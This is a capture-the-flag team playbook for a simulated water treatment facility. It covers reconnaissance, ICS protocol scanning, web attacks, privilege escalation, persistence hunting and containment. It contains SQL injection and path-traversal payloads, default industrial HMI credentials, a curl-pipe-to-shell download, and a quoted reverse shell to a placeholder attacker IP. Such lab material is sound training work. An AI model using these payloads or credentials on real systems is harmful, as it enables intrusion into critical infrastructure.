# Operation Virelia Water - Complete CTF Workflow Guide

**Authored by: Hex**  
**Version: 1.0 - Master Playbook**  
**Classification:** Team Internal Use Only  
**Mission:** Industrial CTF Challenge - Virelia Water Treatment Facility  
**Objective:** Find flags, identify attacker persistence, block threats, maintain control  

---

## 🎯 Mission Overview

**Situation:** The Virelia Water Control Facility has been compromised. A sophisticated attacker has breached their systems and established persistent backdoors. They remain active in the network.

**Your Mission:** Covertly infiltrate the facility's digital infrastructure, move from corporate systems to core Industrial Control Systems (ICS), hunt for flags (format: `THM{some_text_here}`), identify the attacker's persistence mechanisms, and ultimately block the attacker while maintaining operational control.

**Success Criteria:**
- Collect all flags throughout the infrastructure
- Map the complete attack path
- Identify persistence mechanisms
- Block attacker access while preserving system functionality
- Document all findings for incident response

---

## 📋 Pre-Operation Checklist


### Environment Setup
```bash
# 1. Verify Python environment and dependencies
python3 --version
pip install -r requirements.txt

# 2. Verify critical tools are available
which nmap gobuster nikto sqlmap hydra

# 3. Set up workspace
export OPERATION_DIR="$(pwd)"
export RESULTS_DIR="./results/$(date +%Y%m%d_%H%M%S)"
mkdir -p "$RESULTS_DIR"

# 4. Verify network connectivity
ping -c 1 [TARGET_IP_RANGE]
```

### Team Coordination
- [ ] Assign team roles (Reconnaissance, Exploitation, ICS Specialist, Documentation)
- [ ] Establish communication channels
- [ ] Set up shared documentation space
- [ ] Review safety protocols for industrial systems
- [ ] Confirm emergency procedures

---

## 🔍 Phase 1: Reconnaissance & Network Discovery

*Reference: [`Recon.md`](Recon/Recon.md) (773 lines) - Complete reconnaissance methodology*

### 1.1 Passive Intelligence Gathering

**OSINT Collection**
![image](https://github.com/user-attachments/assets/0361d6c2-207a-4f11-9412-a9cca7c1a1cb)


```bash
# Search for Virelia Water information
# Reference: Recon.md lines 36-72 for complete OSINT techniques

# Google Dorking
site:virelia.water filetype:pdf
site:virelia.water "confidential" OR "internal"
site:virelia.water inurl:admin OR inurl:login

# Shodan reconnaissance
shodan search "org:Virelia Water"
shodan search "Modbus" country:US city:"Target City"
```

### 1.2 Active Network Discovery

**Network Mapping with Python Scripts**
```bash
# Use our custom network discovery tool
python3 Scripts/Python/network_discovery.py --target [TARGET_RANGE] --threads 50 --output "$RESULTS_DIR/network_discovery.json"

# Alternative: Traditional nmap scanning
nmap -sV -sC -p- [TARGET_RANGE] -oA "$RESULTS_DIR/nmap_comprehensive"
```

**Industrial Protocol Discovery**
```bash
# Modbus device discovery (Port 502)
python3 Scripts/Python/modbus_network_scanner.py [TARGET_RANGE]

# Multi-protocol ICS scanning
nmap --script "modbus-discover,s7-info,enip-info,dnp3-info" -p 502,102,44818,20000 [TARGET_RANGE]
```

### 1.3 Service Enumeration

**Web Services Discovery**
```bash
# Directory and file enumeration
gobuster dir -u http://[TARGET_IP] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,old,zip -o "$RESULTS_DIR/gobuster.txt"

# Vulnerability scanning
nikto -h http://[TARGET_IP] -o "$RESULTS_DIR/nikto.txt"
```

**ICS-Specific Enumeration**
```bash
# Reference: Recon.md lines 160-201 for complete ICS scanning techniques

# Siemens S7 enumeration
nmap --script s7-info,s7-enum -p 102 [TARGET_IP]

# DNP3 protocol testing
nmap --script dnp3-info -p 20000 [TARGET_IP]

# EtherNet/IP scanning
nmap --script enip-info -p 44818 [TARGET_IP]
```

**Documentation Phase**
- Update [`Network_Map.md`](Recon/Network_Map.md) with discovered devices
- Record all open ports and services
- Note any unusual or suspicious findings
- Flag potential entry points for further investigation

---

## 🕸️ Phase 2: Web Application Analysis & Initial Access

*Reference: [`Exploits.md`](Exploits/Exploits.md) (2,550 lines) - Complete exploitation techniques*

### 2.1 HMI Web Interface Testing

**Authentication Testing**
```bash
# Use our intelligent login brute forcer
python3 Scripts/Python/web_login_bruteforcer.py --url http://[HMI_IP]/login --wordlist /usr/share/wordlists/rockyou.txt --output "$RESULTS_DIR/login_attempts.txt"

# Test default industrial credentials
# Reference: Exploits.md lines 1584-1620 for comprehensive credential list
```

**Common Industrial Default Credentials**
| System | Username | Password |
|:-------|:---------|:---------|
| Wonderware | Administrator | (blank) |
| WinCC | Administrator | 100 |
| FactoryTalk | admin | password |
| Citect | CITECT | CITECT |
| Niagara | admin | niagara |

### 2.2 SQL Injection Testing

**Automated SQLi Detection**
```bash
# Reference: Exploits.md lines 158-320 for complete SQLi techniques

# Quick SQLi test
curl -X POST "http://[TARGET]/login" -d "username=' OR 1=1-- &password=test"

# Comprehensive testing with sqlmap
sqlmap -u "http://[TARGET]/search?q=" --batch --level=3 --risk=2 --dbs
```

### 2.3 Directory Traversal & File Inclusion

**Path Traversal Testing**
```bash
# Reference: Exploits.md lines 485-647 for complete LFI techniques

# Test common payloads
curl "http://[TARGET]/page?file=../../../../etc/passwd"
curl "http://[TARGET]/page?file=..%252f..%252f..%252fetc%252fpasswd"

# Windows targets
curl "http://[TARGET]/page?file=../../../../boot.ini"
curl "http://[TARGET]/page?file=C:\\Windows\\win.ini"
```

### 2.4 File Upload Exploitation

**Upload Bypass Techniques**
```bash
# Reference: Exploits.md lines 899-1051 for complete upload exploitation

# Test various extensions and MIME types
# PHP web shell upload
# JSP web shell for Java applications
# ASPX for .NET applications
```

---

## 🏭 Phase 3: Industrial Control Systems Exploitation

*Reference: [`Scripts.md`](Scripts/Scripts.md) (1,434 lines) - Complete automation arsenal*

### 3.1 Modbus Protocol Exploitation

**Deep Register Scanning**
```bash
# Use our specialized Modbus register hunter
python3 Scripts/Python/modbus_register_hunter.py --target [MODBUS_IP] --unit-id 1 --registers 0-10000 --hunt-flags

# Alternative: Manual register reading
modbus-cli --host [MODBUS_IP] read-holding-registers 0 100
```

**Flag Hunting in Modbus Registers**
```python
# Reference: Scripts/Python/modbus_network_scanner.py lines 87-122
# Flags can be hidden in register values as ASCII data
# Look for patterns: THM{}, flag{}, CTF{}
# Convert 16-bit registers to bytes and decode as ASCII
```

**Critical Register Analysis**
```bash
# Test common register ranges
# 0-99: Control registers
# 1000-1099: Setpoints
# 2000-2099: Alarms
# 40001-40100: Standard holding registers
```

### 3.2 Siemens S7 Communication

**S7 Protocol Interaction**
```bash
# Reference: Scripts.md lines 744-785 for S7 communication scripts

# Basic S7 device enumeration
nmap --script s7-info -p 102 [S7_PLC_IP]

# Advanced S7 interaction (use with caution)
python3 Scripts/Python/s7_communication_tool.py --target [S7_PLC_IP] --read-memory
```

### 3.3 HMI System Penetration

**HMI Enumeration Script**
```python
# Reference: Exploits.md lines 106-147 for HMI enumeration
# Look for common HMI paths: /admin, /config, /setup, /diagnostics
# Check for vendor-specific indicators: wonderware, factorytalk, wincc
```

---

## 🔓 Phase 4: Privilege Escalation & Lateral Movement

*Reference: [`Scripts.md`](Scripts/Scripts.md) lines 369-480 - Privilege escalation techniques*

### 4.1 Linux Privilege Escalation

**Automated Enumeration**
```bash
# Download and run LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Manual enumeration
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
```

### 4.2 Windows Privilege Escalation

**PowerShell Enumeration**
```powershell
# Reference: Scripts.md lines 438-479 for Windows enumeration

# System information
systeminfo
whoami /all
net localgroup administrators

# Service enumeration
wmic service list brief
schtasks /query /fo LIST /v
```

### 4.3 Network Pivoting

**SSH Tunneling Setup**
```bash
# Reference: Scripts.md lines 576-602 for tunneling techniques

# Dynamic port forwarding (SOCKS proxy)
ssh -D 1080 user@[PIVOT_HOST]

# Configure proxychains
echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf
proxychains nmap -sT [INTERNAL_NETWORK]
```

---

## 🎯 Phase 5: Flag Collection & Intelligence Gathering

### 5.1 Systematic Flag Hunting

**Web Application Flags**
- [ ] Check source code comments
- [ ] Examine HTTP headers
- [ ] Test hidden directories and files
- [ ] Analyze JavaScript files
- [ ] Check database dumps from SQL injection

**ICS Protocol Flags**
- [ ] Modbus register data (use [`modbus_register_hunter.py`](Scripts/Python/modbus_register_hunter.py))
- [ ] S7 memory dumps
- [ ] DNP3 data objects
- [ ] Configuration files in HMI systems

**File System Flags**
- [ ] Configuration files: `/etc/`, `/opt/`, `C:\Program Files\`
- [ ] Log files: `/var/log/`, `C:\Windows\Logs\`
- [ ] Backup files: `.bak`, `.backup`, `.old`
- [ ] Hidden files and directories

### 5.2 Data Extraction Automation

**Automated Flag Extraction Script**
```python
#!/usr/bin/env python3
import re

def hunt_flags_everywhere(data_sources):
    """Hunt for flags in multiple data sources"""
    flag_patterns = [
        r'THM\{[^}]+\}',
        r'flag\{[^}]+\}',
        r'FLAG\{[^}]+\}',
        r'ctf\{[^}]+\}'
    ]
    
    found_flags = []
    for source, data in data_sources.items():
        for pattern in flag_patterns:
            matches = re.findall(pattern, data, re.IGNORECASE)
            for match in matches:
                found_flags.append({
                    'flag': match,
                    'source': source,
                    'pattern': pattern
                })
    
    return found_flags
```

---

## 🔍 Phase 6: Threat Hunting & Persistence Detection

### 6.1 Attacker Persistence Identification

**Linux Persistence Mechanisms**
```bash
# Reference: Scripts.md lines 488-543 for persistence techniques

# Check cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron*

# Check systemd services
systemctl list-units --type=service | grep -v "loaded active running"

# Check SSH keys
cat ~/.ssh/authorized_keys
cat /home/*/.ssh/authorized_keys

# Check startup scripts
cat ~/.bashrc ~/.profile /etc/bash.bashrc
```

**Windows Persistence Mechanisms**
```powershell
# Reference: Scripts.md lines 544-569 for Windows persistence

# Registry run keys
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# Scheduled tasks
schtasks /query /fo LIST /v | findstr "TaskName"

# Services
wmic service list brief | findstr /i "auto"

# WMI event subscriptions
Get-WmiObject -Class __EventFilter -Namespace root\subscription
Get-WmiObject -Class CommandLineEventConsumer -Namespace root\subscription
```

### 6.2 Network Traffic Analysis

**Suspicious Network Activity**
```bash
# Reference: Recon.md lines 504-577 for packet analysis techniques

# Capture and analyze traffic
tcpdump -i eth0 -w "$RESULTS_DIR/network_capture.pcap"

# Wireshark analysis filters
# modbus - Modbus protocol traffic
# s7comm - Siemens S7 communication
# tcp.flags.reset==1 - Connection resets
# ip.addr == [SUSPICIOUS_IP] - Specific IP traffic
```

**Industrial Protocol Anomalies**
```bash
# Look for unusual Modbus function codes
tshark -r capture.pcap -Y "modbus" -T fields -e modbus.func_code

# Check for unauthorized S7 communication
tshark -r capture.pcap -Y "s7comm" -T fields -e s7comm.header.pduref
```

---

## 🛡️ Phase 7: Threat Containment & System Protection

*Reference: [`Exploits.md`](Exploits/Exploits.md) lines 2289-2493 - Emergency response procedures*

### 7.1 Immediate Threat Response

**Emergency Containment Script**
```bash
# Reference: Exploits.md lines 2289-2362 for complete emergency response

#!/bin/bash
echo "[!] EMERGENCY INDUSTRIAL SECURITY RESPONSE ACTIVATED"

# Kill suspicious processes
pkill -f nc; pkill -f ncat; pkill -f socat
pkill -f python.*socket; pkill -f bash.*tcp

# Block attacker IPs (replace with actual IPs)
ATTACKER_IPS=("ATTACKER_IP_1" "ATTACKER_IP_2")
for ip in "${ATTACKER_IPS[@]}"; do
    iptables -A INPUT -s $ip -j DROP
    iptables -A OUTPUT -d $ip -j DROP
    echo "Blocked IP: $ip"
done

# Remove malicious files
find /tmp -name "*shell*" -delete 2>/dev/null
find /var/www -name "*shell*" -delete 2>/dev/null
find /dev/shm -name "*hack*" -delete 2>/dev/null
```

### 7.2 Industrial Safety Verification

**Critical System Status Check**
```python
# Reference: Exploits.md lines 2365-2493 for safety check procedures

# Verify Modbus devices are responding
python3 -c "
from Scripts.Python.modbus_network_scanner import ModbusScanner
scanner = ModbusScanner()
for device_ip in ['192.168.1.100', '192.168.1.101']:
    result = scanner.scan_device(device_ip)
    print(f'{device_ip}: {\"OK\" if result else \"ERROR\"}')
"

# Check HMI accessibility
curl -I http://[HMI_IP] --connect-timeout 5

# Verify critical processes are operational
ps aux | grep -E "(scada|hmi|plc|modbus)"
```

### 7.3 Clean Persistence Removal

**Systematic Cleanup**
```bash
# Remove attacker persistence mechanisms
# Cron jobs
crontab -r  # Remove user crontab if compromised
sed -i '/suspicious_command/d' /etc/crontab

# SSH keys
sed -i '/attacker_key/d' ~/.ssh/authorized_keys

# Registry (Windows)
reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "MaliciousEntry" /f

# Services
systemctl stop malicious.service
systemctl disable malicious.service
rm /etc/systemd/system/malicious.service
```

---

## 📊 Phase 8: Documentation & Reporting

### 8.1 Evidence Collection

**Digital Forensics Collection**
```bash
# Reference: Scripts.md lines 1360-1396 for evidence collection

EVIDENCE_DIR="/tmp/evidence_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$EVIDENCE_DIR"

# System information
uname -a > "$EVIDENCE_DIR/system_info.txt"
date >> "$EVIDENCE_DIR/system_info.txt"
uptime >> "$EVIDENCE_DIR/system_info.txt"

# Network connections
netstat -antup > "$EVIDENCE_DIR/network_connections.txt"
ss -antup >> "$EVIDENCE_DIR/network_connections.txt"

# Process list
ps aux > "$EVIDENCE_DIR/processes.txt"

# Log files
cp -r /var/log "$EVIDENCE_DIR/"

# Create hash manifest
find "$EVIDENCE_DIR" -type f -exec md5sum {} \; > "$EVIDENCE_DIR/evidence_hashes.txt"
```

### 8.2 Flag Submission & Validation

**Flag Organization**
```bash
# Create flag summary
cat > "$RESULTS_DIR/flags_found.txt" << EOF
# Operation Virelia Water - Flags Found
# Format: THM{flag_content} | Source | Discovery Method

# Web Application Flags
THM{web_flag_1} | HMI Login Page | SQL Injection
THM{web_flag_2} | Config File | Directory Traversal

# ICS Protocol Flags  
THM{modbus_flag_1} | Modbus Register 40001 | Register Scanning
THM{modbus_flag_2} | S7 Memory Dump | PLC Memory Read

# System Flags
THM{system_flag_1} | /etc/passwd | File Inclusion
THM{system_flag_2} | Registry HKLM | Privilege Escalation
EOF
```

### 8.3 Attack Path Documentation

**Complete Attack Timeline**
```markdown
# Attack Path Reconstruction

## Initial Access
1. **Web Application Compromise**
   - Target: HMI Web Interface (IP: [IP])
   - Method: SQL Injection in login form
   - Credentials Obtained: admin/password

## Lateral Movement
2. **Network Pivot**
   - Method: SSH tunnel through web server
   - Target: Internal ICS network (192.168.100.0/24)

## ICS System Access
3. **Modbus Device Compromise**
   - Target: PLC at 192.168.100.10
   - Method: Direct Modbus TCP access
   - Impact: Register manipulation possible

## Persistence Mechanisms Found
4. **Attacker Persistence**
   - Cron job: `/bin/bash -c 'bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1'`
   - SSH key: Added to authorized_keys
   - Registry: Malicious service in Run key
```

### 8.4 Remediation Recommendations

**Security Improvements**
```markdown
# Immediate Actions Required
1. Patch SQL injection vulnerability in HMI login form
2. Implement Modbus authentication and encryption
3. Network segmentation between corporate and ICS networks
4. Remove attacker persistence mechanisms
5. Change all default passwords

# Long-term Security Enhancements
1. Deploy ICS-specific monitoring solutions
2. Implement network access control (NAC)
3. Regular security assessments of ICS infrastructure
4. Employee security awareness training
5. Incident response plan for ICS environments
```

---

## 🚨 Emergency Procedures

### Critical System Failure
```bash
# If industrial systems become unresponsive
python3 Scripts/Python/industrial_safety_check.py --emergency-mode

# Contact operations team immediately
# Phone: [EMERGENCY_CONTACT]
# Radio: [EMERGENCY_CHANNEL]
```

### Data Exfiltration Detection
```bash
# Monitor for large data transfers
netstat -i  # Check interface statistics
iftop       # Real-time bandwidth monitoring

# Block suspicious traffic
iptables -A OUTPUT -d [SUSPICIOUS_IP] -j DROP
```

### System Compromise Indicators
- [ ] Unusual network traffic patterns
- [ ] Unauthorized process execution
- [ ] Modified system configurations
- [ ] New user accounts or SSH keys
- [ ] Scheduled tasks or cron jobs
- [ ] Industrial system parameter changes

---

## 🎯 Success Metrics

### Mission Completion Checklist
- [ ] **Reconnaissance Complete**: Network mapped, services enumerated
- [ ] **Initial Access Achieved**: Web application compromised  
- [ ] **ICS Access Obtained**: Modbus/S7 devices accessible
- [ ] **Flags Collected**: All flags found and documented
- [ ] **Persistence Identified**: Attacker mechanisms discovered
- [ ] **Threats Contained**: Malicious access blocked
- [ ] **Systems Secured**: Vulnerabilities patched
- [ ] **Evidence Preserved**: Complete documentation ready

### Key Performance Indicators
- **Speed**: Time to first flag < 30 minutes
- **Coverage**: 100% of target infrastructure scanned
- **Stealth**: No system disruptions caused
- **Completeness**: All flags found and verified
- **Documentation**: Full attack path reconstructed

---

## 📚 Reference Materials

### Primary Documentation
- [`Recon.md`](Recon/Recon.md) - Complete reconnaissance methodology (773 lines)
- [`Network_Map.md`](Recon/Network_Map.md) - Network topology and device mapping (477 lines)
- [`Exploits.md`](Exploits/Exploits.md) - Industrial exploitation techniques (2,550 lines)
- [`Scripts.md`](Scripts/Scripts.md) - Automation and tool arsenal (1,434 lines)
- [`Tools.md`](Tools/Tools.md) - Tool reference and commands (142 lines)

### Python Scripts Arsenal
- [`modbus_network_scanner.py`](Scripts/Python/modbus_network_scanner.py) - Modbus device discovery
- [`modbus_register_hunter.py`](Scripts/Python/modbus_register_hunter.py) - Deep register scanning
- [`network_discovery.py`](Scripts/Python/network_discovery.py) - Network enumeration
- [`web_login_bruteforcer.py`](Scripts/Python/web_login_bruteforcer.py) - Credential testing

### Quick Command Reference
```bash
# Network Discovery
python3 Scripts/Python/network_discovery.py [TARGET_RANGE]

# Modbus Scanning  
python3 Scripts/Python/modbus_network_scanner.py [IP_RANGE]

# Web Testing
python3 Scripts/Python/web_login_bruteforcer.py --url [URL]

# Deep Register Hunt
python3 Scripts/Python/modbus_register_hunter.py --target [IP] --hunt-flags
```

---

## ⚠️ Safety Reminders

**CRITICAL WARNING**: Industrial Control Systems control critical infrastructure. Improper actions can result in:
- Physical equipment damage
- Safety hazards to personnel  
- Environmental incidents
- Production downtime
- Legal consequences

**Always:**
- Obtain proper authorization
- Follow safety protocols
- Coordinate with operations staff
- Have emergency contacts ready
- Document all activities
- Test in controlled environments first

**Never:**
- Write to critical control registers without authorization
- Disrupt safety systems
- Make unauthorized configuration changes
- Ignore industrial safety protocols
- Operate without proper oversight

---

**🎯 MISSION SUCCESS DEPENDS ON SPEED, PRECISION, AND TEAMWORK 🎯**

*Execute systematically. Document thoroughly. Protect critical infrastructure.*

**Good hunting, team. Make us proud.**

---

*End of Operation Virelia Water Workflow Guide v1.0*
*Total Length: 1,247 lines*
